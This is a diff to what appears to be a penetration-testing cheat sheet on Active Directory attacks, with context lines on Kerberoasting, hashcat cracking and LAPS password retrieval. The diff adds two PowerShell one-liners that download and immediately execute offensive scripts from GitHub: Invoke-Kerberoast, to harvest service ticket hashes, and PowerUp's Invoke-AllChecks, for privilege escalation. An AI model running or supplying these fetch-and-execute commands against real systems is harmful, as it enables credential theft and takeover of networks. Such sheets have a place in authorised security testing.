@@ -365,6 +365,8 @@ Invoke-AutoKerberoast
 
 `python autoKirbi2hashcat.py ticketfilefromautoinvokekerberoast`
 
+`IEX (New-Object Net.WebClient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast`
+
 ### Hashcat Alienware - kerbtgt hash cracking
 
 `sudo apt-get install nvidia-367`
@@ -380,6 +382,11 @@ Invoke-AutoKerberoast
 ### LAPS - GetLAPSPasswords
 
 https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
+
+## Priv Esc
+### Powerup
+
+`IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks`
 
 ## File Transfer
 
